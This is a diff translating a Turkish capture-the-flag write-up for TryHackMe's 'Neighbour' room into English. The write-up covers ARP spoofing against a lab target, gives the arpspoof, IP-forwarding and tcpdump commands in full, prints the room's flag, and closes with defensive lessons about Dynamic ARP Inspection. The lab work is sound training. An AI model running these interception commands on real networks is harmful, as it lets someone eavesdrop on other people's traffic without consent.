@@ -1,120 +1,74 @@
 # Neighbour — TryHackMe
 
-
-> Bu makinede ARP spoofing ile bayrağı nasıl yakaladım.
-
+> How I caught the flag with ARP spoofing.
 
 ---
 
-
-## Önce Bir Bakalım
-
+## First Look
 
 ```bash
-
 nmap -sn 10.10.10.0/24
-
 ```
 
-
-Ağda birkaç makine var. Hedef IP'miz `10.10.10.5`. ARP tablosuna baktım, pek bir şey yok. Peki ya trafiği dinlersem?
-
+Few machines on the network. Target is `10.10.10.5`. Checked the ARP table — pretty empty. What if I just listen to the traffic?
 
 ---
 
+## ARP's Weakness
 
-## ARP'in Zayıflığı
+ARP has this fun quirk: **you can answer even when no one asked.** A machine shouts "I'm this IP!" and others just go "Okay." No verification.
 
-
-ARP'in güzel bir özelliği var: **Kimse sormadan da cevap verebilirsin.** Yani bir makine "Ben şu IP'yim" diye bağırsa, diğerleri "Tamam" diyor. Doğrulama yok.
-
-
-Bu makine de tam bunu bekliyor. Sahte ARP paketleriyle araya girmem lazım.
-
+This machine is literally waiting for that. I need to slip in the middle with fake ARP packets.
 
 ---
 
+## Setting Up the Attack
 
-## Saldırıyı Kuralım
-
-
-Önce IP forwarding'i açtım ki trafik bende takılı kalmasın:
-
+First, enabled IP forwarding so traffic doesn't die on my machine:
 
 ```bash
-
 echo 1 > /proc/sys/net/ipv4/ip_forward
-
 ```
 
-
-Sonra iki yönlü spoofing başlattım:
-
+Then fired up two-way spoofing:
 
 ```bash
-
 arpspoof -i tun0 -t 10.10.10.5 10.10.10.1
-
 arpspoof -i tun0 -t 10.10.10.1 10.10.10.5
-
 ```
 
-
-Biraz bekledim. Wireshark açık, trafik akıyor.
-
+Waited a bit. Wireshark open, traffic flowing.
 
 ---
 
+## Catching the Flag
 
-## Bayrağı Yakalama
-
-
-HTTP trafiği görünce gözüm parladı. `tcpdump` ile yakaladım:
-
+Saw HTTP traffic and got excited. Dumped it with tcpdump:
 
 ```bash
-
 tcpdump -i tun0 -w neighbour.pcap
-
 ```
 
-
-Sonra içine baktım:
-
+Then dug in:
 
 ```bash
-
 strings neighbour.pcap | grep -i "THM"
-
 ```
 
-
-Ve işte:
-
+And there it was:
 
 ```
-
 THM{ARP_Sp00f1ng_1s_E4sy}
-
 ```
 
 ---
 
+## What I Learned
 
-## Neler Öğrendim?
-
-
-- ARP **güvensiz** bir protokol. Herhangi bir cihaz "ben bu IP'yim" diyebilir.
-
-- Ağda **Dynamic ARP Inspection (DAI)** yoksa bu saldırı çok kolay.
-
-- `arpspoof` kullanmak 5 dakika, tespit etmek ise çok daha zor.
-
+- ARP is an **insecure** protocol. Any device can claim "I'm this IP."
+- Without **Dynamic ARP Inspection (DAI)**, this attack is trivial.
+- `arpspoof` takes 5 minutes. Detecting it? Way harder.
 
 ---
 
-
-> Yazan: Miraç | Tarih: Mayıs 2026
-
-
-tek kelimeyle bu nasıl
+> Author: Miraç | Date: May 2026
